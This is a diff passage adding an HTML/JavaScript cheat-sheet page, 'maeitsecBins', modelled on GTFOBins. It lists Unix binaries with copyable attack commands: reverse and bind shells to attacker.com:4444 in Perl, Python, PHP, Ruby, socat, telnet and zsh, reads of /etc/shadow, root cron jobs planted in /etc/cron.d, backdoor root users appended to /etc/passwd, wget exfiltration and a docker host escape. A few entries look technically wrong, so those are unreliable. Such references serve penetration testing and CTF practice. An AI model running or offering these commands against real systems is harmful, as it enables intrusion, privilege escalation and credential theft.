+'`},{type:"file-read",ctx:["sudo"],desc:"Read a file.",code:`node -e 'console.log(require("fs").readFileSync("/etc/shadow","utf8"))'`},{type:"file-write",ctx:["sudo"],desc:"Write a file.",code:`node -e 'require("fs").writeFileSync("/etc/cron.d/evil","* * * * * root /bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1\n")'`}]],
+["nohup",["shell","command"],[{type:"shell",ctx:["sudo"],desc:"Spawn a persistent shell.",code:`nohup /bin/sh &`},{type:"command",ctx:["sudo"],desc:"Run a command immune to hangups.",code:`nohup id`}]],
+["npm",["shell"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via npm scripts.",code:`npm -C /tmp --unsafe-perm i
+# In /tmp/package.json: {"scripts":{"install":"/bin/sh -i"}}`}]],
+["openssl",["reverse-shell","file-write","file-read","upload","download","library-load"],[{type:"reverse-shell",ctx:["unprivileged"],desc:"Encrypted reverse shell.",code:`# On attacker:
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
+# On target:
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect attacker.com:4444 > /tmp/s; rm /tmp/s`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file via openssl enc.",code:`openssl enc -in /etc/shadow`},{type:"file-write",ctx:["sudo","suid"],desc:"Write a file.",code:`openssl enc -in /tmp/evil -out /etc/cron.d/evil`}]],
+["passwd",["privilege-escalation"],[{type:"privilege-escalation",ctx:["suid"],desc:"Overwrite /etc/passwd to add a root user.",code:`openssl passwd evil
+# Copy output then:
+echo 'evil:OUTPUT:0:0:root:/root:/bin/bash' >> /etc/passwd`}]],
+["perl",["shell","reverse-shell","file-read","upload","download"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via Perl.",code:`perl -e 'exec "/bin/sh";'`},{type:"reverse-shell",ctx:["unprivileged"],desc:"Reverse shell via Perl socket.",code:`perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`perl -e 'local $/; open(f,"/etc/shadow"); print <f>'`}]],
+["php",["shell","command","reverse-shell","file-write","file-read","upload","download"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via PHP.",code:`php -r 'system("/bin/sh");'`},{type:"reverse-shell",ctx:["unprivileged"],desc:"Reverse shell via PHP.",code:`php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`php -r 'echo file_get_contents("/etc/shadow");'`},{type:"file-write",ctx:["sudo","suid"],desc:"Write a file.",code:`php -r 'file_put_contents("/etc/cron.d/evil","* * * * * root /bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1\n");'`}]],
+["pip",["shell"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via pip.",code:`pip install --upgrade --user setup
+# Malicious setup.py with os.system('/bin/sh')`}]],
+["pkexec",["shell"],[{type:"shell",ctx:["suid"],desc:"Execute a program as another user (CVE-2021-4034).",code:`pkexec /bin/sh`}]],
+["python",["shell","reverse-shell","file-write","file-read","upload","download","library-load"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via Python os.system.",code:`python -c 'import os;os.system("/bin/sh")'`},{type:"reverse-shell",ctx:["unprivileged"],desc:"Reverse shell via Python socket.",code:`python -c '
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("attacker.com",4444))
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
+import pty;pty.spawn("/bin/sh")'`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`python -c 'print(open("/etc/shadow").read())'`},{type:"file-write",ctx:["sudo","suid"],desc:"Write a file.",code:`python -c 'open("/etc/cron.d/evil","w").write("* * * * * root /bin/sh\n")'`}]],
+["rake",["file-read"],[{type:"file-read",ctx:["sudo"],desc:"Read a file via Rake's --rakelibdir.",code:`rake -f /etc/shadow 2>&1`}]],
+["ruby",["shell","reverse-shell","file-write","file-read","upload","download","library-load"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via Ruby.",code:`ruby -e 'exec "/bin/sh"'`},{type:"reverse-shell",ctx:["unprivileged"],desc:"Reverse shell via Ruby.",code:`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`ruby -e 'puts File.read("/etc/shadow")'`}]],
+["rsync",["shell"],[{type:"shell",ctx:["sudo","suid"],desc:"Execute a shell command via rsync -e.",code:`rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`}]],
+["scp",["shell","upload","download"],[{type:"shell",ctx:["sudo"],desc:"Execute a shell via scp -S.",code:`scp -S /tmp/evil user@host:/tmp/
+# /tmp/evil: #!/bin/sh\n/bin/sh`},{type:"upload",ctx:["unprivileged"],desc:"Upload a file.",code:`scp /etc/passwd user@attacker.com:/tmp/`},{type:"download",ctx:["unprivileged"],desc:"Download a file.",code:`scp user@attacker.com:/tmp/payload /tmp/payload`}]],
+["screen",["shell","file-write"],[{type:"shell",ctx:["sudo","suid"],desc:"Execute a shell via screen -X.",code:`screen -X stuff "exec /bin/sh"
+screen -r
+/bin/sh`}]],
+["sed",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Execute a shell via sed's e flag.",code:`sed -n '1e exec /bin/sh 1>&0' /dev/stdin`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`sed '' /etc/shadow`},{type:"file-write",ctx:["sudo","suid"],desc:"Write to a file with w command.",code:`sed -n 'w /etc/cron.d/evil' /tmp/evil`}]],
+["setarch",["shell"],[{type:"shell",ctx:["sudo"],desc:"Run a shell under a different arch personality.",code:`setarch $(arch) /bin/sh`}]],
+["sftp",["shell","upload","download"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell from sftp.",code:`sftp user@host
+!/bin/sh`}]],
+["socat",["shell","reverse-shell","bind-shell","file-write","file-read","upload","download"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a PTY shell.",code:`socat stdin exec:/bin/sh`},{type:"reverse-shell",ctx:["unprivileged"],desc:"Open a reverse shell with PTY.",code:`# On attacker:
+socat file:\`tty\`,raw,echo=0 tcp-listen:4444
+# On target:
+socat tcp-connect:attacker.com:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane`},{type:"bind-shell",ctx:["unprivileged"],desc:"Open a bind shell.",code:`socat tcp-listen:4444,reuseaddr exec:/bin/sh`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`socat -u file:/etc/shadow tcp:attacker.com:4444`},{type:"file-write",ctx:["sudo","suid"],desc:"Write a file.",code:`echo evil | socat - file:/etc/cron.d/evil`}]],
+["sort",["file-write","file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file via sort.",code:`sort /etc/shadow`},{type:"file-write",ctx:["sudo","suid"],desc:"Write sorted output to a file.",code:`sort /tmp/evil -o /etc/cron.d/evil`}]],
+["split",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Execute a command via split's --filter.",code:`split --filter=/bin/sh /dev/stdin`}]],
+["sqlite3",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via sqlite3.",code:`sqlite3 /dev/null '.shell /bin/sh'`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`sqlite3 '' '.import /etc/shadow t' 'select * from t'`},{type:"file-write",ctx:["sudo","suid"],desc:"Write a file.",code:`sqlite3 /tmp/db 'create table t (d text)'; sqlite3 /tmp/db '.import /etc/shadow t'; sqlite3 /tmp/db '.output /tmp/out'; sqlite3 /tmp/db 'select * from t';`}]],
+["ssh",["shell","file-read","upload","download"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via ssh with ProxyCommand.",code:`ssh -o ProxyCommand=';sh 0<&2 1>&2' x`},{type:"file-read",ctx:["sudo"],desc:"Read a file via ssh's -F flag.",code:`ssh -F /etc/shadow x 2>&1`}]],
+["strace",["shell","file-write"],[{type:"shell",ctx:["sudo","suid"],desc:"Execute a command via strace.",code:`strace -o /dev/null /bin/sh`}]],
+["su",["shell"],[{type:"shell",ctx:["sudo"],desc:"Switch to root user.",code:`su -`}]],
+["sudo",["shell"],[{type:"shell",ctx:["sudo"],desc:"Run a shell as root.",code:`sudo -s`}]],
+["systemctl",["shell"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via systemctl.",code:`TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/id"
+[Install]
+WantedBy=multi-user.target' > $TF
+systemctl link $TF
+systemctl enable --now $TF`}]],
+["tail",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`tail -c 1G /etc/shadow`}]],
+["tar",["shell","file-write","file-read","upload","download"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via tar --checkpoint.",code:`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file by archiving and extracting.",code:`tar xf /etc/shadow -I 'sh -c "cat > /tmp/out"'`}]],
+["tee",["file-write"],[{type:"file-write",ctx:["sudo","suid"],desc:"Write to a privileged file.",code:`echo 'data' | tee /etc/cron.d/evil`}]],
+["telnet",["shell","reverse-shell"],[{type:"reverse-shell",ctx:["unprivileged"],desc:"Reverse shell via telnet.",code:`TF=$(mktemp -u); mkfifo $TF && telnet attacker.com 4444 0<$TF | /bin/sh 1>$TF`}]],
+["tmux",["shell","file-read"],[{type:"shell",ctx:["unprivileged"],desc:"Attach to or create a privileged tmux session.",code:`tmux new-session /bin/sh`},{type:"file-read",ctx:["sudo"],desc:"Read a file.",code:`tmux source /etc/shadow`}]],
+["top",["shell"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via top's command prompt.",code:`top
+k
+<PID>
+9
+!
+/bin/sh`}]],
+["vi",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell from vi.",code:`vi -c ':!/bin/sh' /dev/null`},{type:"file-read",ctx:["sudo"],desc:"Read any file.",code:`vi /etc/shadow`}]],
+["vim",["file-read"],[{type:"file-read",ctx:["sudo"],desc:"Read any file.",code:`vim /etc/shadow`},{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell from vim.",code:`vim -c ':!/bin/sh'`}]],
+["watch",["shell"],[{type:"shell",ctx:["sudo"],desc:"Run a command repeatedly and spawn a shell.",code:`watch -x sh -c 'reset; exec sh 1>&0 2>&0'`}]],
+["wget",["shell","file-write","file-read","upload","download"],[{type:"file-write",ctx:["sudo","suid"],desc:"Download a file to a privileged location.",code:`wget http://attacker.com/evil -O /etc/cron.d/evil`},{type:"file-read",ctx:["sudo","suid"],desc:"Exfiltrate a file via POST.",code:`wget --post-file=/etc/shadow http://attacker.com/`},{type:"upload",ctx:["unprivileged"],desc:"Upload a file.",code:`wget --post-file=/etc/passwd http://attacker.com/`},{type:"download",ctx:["unprivileged"],desc:"Download a file.",code:`wget http://attacker.com/payload -O /tmp/payload`}]],
+["xxd",["file-write","file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file via hex dump.",code:`xxd /etc/shadow | xxd -r`},{type:"file-write",ctx:["sudo","suid"],desc:"Write a file from hex.",code:`echo '6576696c0a' | xxd -r -p > /etc/cron.d/evil`}]],
+["xargs",["shell","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Execute a shell via xargs.",code:`echo | xargs -I{} /bin/sh`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`xargs -a /etc/shadow -I{} echo {}`}]],
+["zip",["shell","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via zip -T.",code:`TF=$(mktemp -d); echo '/bin/sh' > "$TF/zip_test_script"
+zip -T -TT "$TF/zip_test_script" /dev/null`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file via zip error output.",code:`zip -sf /etc/shadow`}]],
+["zsh",["shell","reverse-shell","file-write","file-read","upload","download"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn an interactive shell.",code:`zsh`},{type:"reverse-shell",ctx:["unprivileged"],desc:"Open a reverse shell.",code:`zsh -c 'zmodload zsh/net/tcp && ztcp attacker.com 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`}]],
+["chattr",["privilege-escalation"],[{type:"privilege-escalation",ctx:["sudo","suid"],desc:"Remove immutable flag from files.",code:`chattr -i /etc/passwd
+echo 'evil::0:0:root:/root:/bin/sh' >> /etc/passwd`}]],
+["dmesg",["file-read"],[{type:"file-read",ctx:["sudo"],desc:"Read a file via dmesg pager.",code:`dmesg -T | cat /etc/shadow`}]],
+["dmsetup",["shell"],[{type:"shell",ctx:["sudo","suid"],desc:"Execute a command via dmsetup ls.",code:`dmsetup ls --exec '/bin/sh -s'`}]],
+["docker",["shell","file-write","file-read"],[{type:"shell",ctx:["unprivileged"],desc:"Escape to root by mounting host filesystem.",code:`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`}]],
+["env",["shell"],[{type:"shell",ctx:["sudo","suid"],desc:"Run a command with modified environment.",code:`env /bin/sh`}]],
+["getent",["privilege-escalation"],[{type:"privilege-escalation",ctx:["suid","capabilities"],desc:"Read any database entry via getent.",code:`getent shadow root`}]],
+["hashcat",["file-write"],[{type:"file-write",ctx:["sudo","suid"],desc:"Write output to a file.",code:`hashcat -r /tmp/rules /etc/shadow -o /tmp/cracked`}]],
+["install",["privilege-escalation"],[{type:"privilege-escalation",ctx:["sudo","suid"],desc:"Install a file with root ownership.",code:`install -m 6777 /tmp/evil /usr/local/bin/evil`}]],
+["jq",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`jq -Rsa . /etc/shadow`}]],
+["mount",["privilege-escalation"],[{type:"privilege-escalation",ctx:["sudo","suid"],desc:"Mount a tmpfs and escape.",code:`mount -t tmpfs tmpfs /tmp && cp /bin/sh /tmp/sh && chmod u+s /tmp/sh && /tmp/sh -p`}]],
+["setcap",["privilege-escalation"],[{type:"privilege-escalation",ctx:["sudo","suid"],desc:"Grant capabilities to a binary.",code:`setcap cap_setuid+ep /tmp/python3
+/tmp/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`}]],
+["setfacl",["privilege-escalation"],[{type:"privilege-escalation",ctx:["sudo","suid"],desc:"Add ACL entry to a privileged file.",code:`setfacl -m u:$USER:rw /etc/shadow`}]],
+["systemd-run",["shell","command"],[{type:"shell",ctx:["sudo"],desc:"Spawn a root shell via transient unit.",code:`systemd-run -t /bin/bash`},{type:"command",ctx:["sudo"],desc:"Execute a command as root.",code:`systemd-run id`}]],
+["tcpdump",["command","file-write"],[{type:"command",ctx:["sudo","capabilities"],desc:"Execute a command via tcpdump -z.",code:`echo '/bin/sh -c "id > /tmp/id"' > /tmp/evil.sh
+chmod +x /tmp/evil.sh
+tcpdump -ln -i lo -w /dev/null -z /tmp/evil.sh -Z root`}]],
+["unshare",["shell"],[{type:"shell",ctx:["sudo","suid"],desc:"Create new user namespace and get root.",code:`unshare -r /bin/sh`}]],
+["unsquashfs",["privilege-escalation"],[{type:"privilege-escalation",ctx:["suid"],desc:"Extract a squashfs with suid files preserved.",code:`unsquashfs -user-xattrs squashfs.img`}]],
+["unzip",["privilege-escalation"],[{type:"privilege-escalation",ctx:["suid"],desc:"Extract suid files.",code:`unzip -: squashfs.img`}]],
+["vagrant",["shell"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via Vagrant's --provision.",code:`vagrant up --provision
+# Vagrantfile with shell: config.vm.provision "shell", inline: "/bin/sh"`}]],
+];
+
+// ─── STATE ───────────────────────────────────────────────────────────────────
+let activeFunc = null;
+let activeCtx = null;
+let searchQ = '';
+let sortDir = 'asc';
+let currentBin = null;
+
+const FUNCS = ['shell','command','reverse-shell','bind-shell','file-write','file-read','upload','download','library-load','privilege-escalation','inherit'];
+const CTXS = ['unprivileged','sudo','suid','capabilities'];
+
+const FUNC_LABELS = {
+  'shell':'Shell','command':'Command','reverse-shell':'Reverse Shell',
+  'bind-shell':'Bind Shell','file-write':'File Write','file-read':'File Read',
+  'upload':'Upload','download':'Download','library-load':'Library Load',
+  'privilege-escalation':'Privilege Escalation','inherit':'Inherit'
+};
+const CTX_LABELS = {
+  'unprivileged':'Unprivileged','sudo':'Sudo','suid':'SUID','capabilities':'Capabilities'
+};
+
+// ─── INIT ────────────────────────────────────────────────────────────────────
+function init() {
+  buildSidebar();
+  bindEvents();
+  render();
+}
+
+function buildSidebar() {
+  const ff = document.getElementById('func-filters');
+  FUNCS.forEach(f => {
+    const b = document.createElement('button');
+    b.className = 'filter-btn';
+    b.dataset.func = f;
+    b.innerHTML = `<span class="dot tag ${f}" style="width:8px;height:8px;padding:0"></span>${FUNC_LABELS[f]}`;
+    b.onclick = () => toggleFunc(f);
+    ff.appendChild(b);
+  });
+
+  const cf = document.getElementById('ctx-filters');
+  CTXS.forEach(c => {
+    const b = document.createElement('button');
+    b.className = 'filter-btn';
+    b.dataset.ctx = c;
+    b.innerHTML = `<span class="dot" style="background:var(--${c==='capabilities'?'caps':c==='unprivileged'?'unpriv':c});width:8px;height:8px;border-radius:50%;display:inline-block"></span>${CTX_LABELS[c]}`;
+    b.onclick = () => toggleCtx(c);
+    cf.appendChild(b);
+  });
+}
+
+function bindEvents() {
+  document.getElementById('search').addEventListener('input', e => {
+    searchQ = e.target.value.toLowerCase().trim();
+    render();
+  });
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape') closeDetail();
+  });
+}
+
+function toggleFunc(f) {
+  activeFunc = activeFunc === f ? null : f;
+  document.querySelectorAll('[data-func]').forEach(b => b.classList.toggle('active', b.dataset.func === activeFunc));
+  render();
+}
+
+function toggleCtx(c) {
+  activeCtx = activeCtx === c ? null : c;
+  document.querySelectorAll('[data-ctx]').forEach(b => b.classList.toggle('active', b.dataset.ctx === activeCtx));
+  render();
+}
+
+function clearAll() {
+  activeFunc = null; activeCtx = null;
+  searchQ = '';
+  document.getElementById('search').value = '';
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  render();
+}
+
+function sortBy(col) {
+  sortDir = sortDir === 'asc' ? 'desc' : 'asc';
+  const th = document.getElementById('th-name');
+  th.className = 'sortable ' + sortDir;
+  render();
+}
+
+// ─── RENDER ──────────────────────────────────────────────────────────────────
+function getFiltered() {
+  // Deduplicate by name (DB has some dupes)
+  const seen = new Set();
+  const unique = DB.filter(([name]) => {
+    if (seen.has(name)) return false;
+    seen.add(name);
+    return true;
+  });
+
+  return unique.filter(([name, funcs, sections]) => {
+    if (searchQ && !name.includes(searchQ) && !funcs.some(f => f.includes(searchQ))) return false;
+    if (activeFunc && !funcs.includes(activeFunc)) return false;
+    if (activeCtx && !sections.some(s => s.ctx && s.ctx.includes(activeCtx))) return false;
+    return true;
+  }).sort((a,b) => sortDir === 'asc' ? a[0].localeCompare(b[0]) : b[0].localeCompare(a[0]));
+}
+
+function render() {
+  const rows = getFiltered();
+  const tbody = document.getElementById('tbody');
+  const noRes = document.getElementById('no-results');
+  document.getElementById('count').textContent = rows.length;
+
+  let info = [];
+  if (activeFunc) info.push(`<span class="tag ${activeFunc}" style="margin:0 .2rem">${FUNC_LABELS[activeFunc]}</span>`);
+  if (activeCtx) info.push(`<span class="ctx-badge ${activeCtx}" style="margin:0 .2rem">${CTX_LABELS[activeCtx]}</span>`);
+  document.getElementById('filter-info').innerHTML = info.length ? 'filtered by ' + info.join(' + ') : '';
+
+  if (rows.length === 0) {
+    tbody.innerHTML = '';
+    noRes.style.display = 'block';
+    return;
+  }
+  noRes.style.display = 'none';
+
+  tbody.innerHTML = rows.map(([name, funcs, sections]) => {
+    const tags = [...new Set(funcs)].map(f => `<span class="tag ${f}" onclick="event.stopPropagation();toggleFunc('${f}')">${FUNC_LABELS[f]||f}</span>`).join('');
+    return `<tr onclick="openDetail('${name}')">
+      <td class="bin-name">${name}</td>
+      <td><div class="tags">${tags}</div></td>
+    </tr>`;
+  }).join('');
+}
+
+// ─── DETAIL PANEL ────────────────────────────────────────────────────────────
+function openDetail(name) {
+  const entry = DB.find(([n]) => n === name);
+  if (!entry) return;
+  const [, funcs, sections] = entry;
+  currentBin = name;
+
+  const allCtx = [...new Set(sections.flatMap(s => s.ctx||[]))];
+  const ctxBadges = allCtx.map(c => `<span class="ctx-badge ${c}">${CTX_LABELS[c]||c}</span>`).join('');
+
+  const sectionsHtml = sections.map((s, i) => {
+    const ctxTags = (s.ctx||[]).map(c => `<span class="ctx-badge ${c}">${CTX_LABELS[c]||c}</span>`).join('');
+    return `<div class="section-card">
+      <div class="section-header">
+        <span class="tag ${s.type}">${FUNC_LABELS[s.type]||s.type}</span>
+        ${ctxTags}
+      </div>
+      <div class="section-body">
+        ${s.desc ? `<p class="section-desc">${s.desc}</p>` : ''}
+        <pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code>${escHtml(s.code)}</code></pre>
+      </div>
+    </div>`;
+  }).join('');
+
+  const funcTags = [...new Set(funcs)].map(f => `<span class="tag ${f}">${FUNC_LABELS[f]||f}</span>`).join('');
+
+  document.getElementById('detail-content').innerHTML = `
+    <div class="detail-title">${name}</div>
+    <div style="color:var(--text2);font-size:.85rem;margin-bottom:.5rem">Unix binary for privilege escalation and post-exploitation</div>
+    <div style="margin:.5rem 0">${ctxBadges}</div>
+    <div class="detail-tags-row">${funcTags}</div>
+    ${sectionsHtml}
+    <a class="detail-link" href="https://gtfobins.github.io/gtfobins/${name}/" target="_blank">🔗 View on GTFOBins.github.io ↗</a>
+    <p class="detail-link" style="margin-top:.3rem;color:var(--text3);font-size:.75rem">maeitsecBins — curated by maeitsec</p>
+  `;
+
+  document.getElementById('overlay').classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+
+function closeDetail(e) {
+  if (e && e.target !== document.getElementById('overlay')) return;
+  document.getElementById('overlay').classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+function copyCode(btn) {
+  const code = btn.nextElementSibling.textContent;
+  navigator.clipboard.writeText(code).then(() => {
+    btn.textContent = 'Copied!';
+    btn.style.background = 'var(--accent)';
+    btn.style.color = '#fff';
+    setTimeout(() => { btn.textContent = 'Copy'; btn.style.background = ''; btn.style.color = ''; }, 1500);
+  });
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+init();
+</script>
+</body>
+</html>
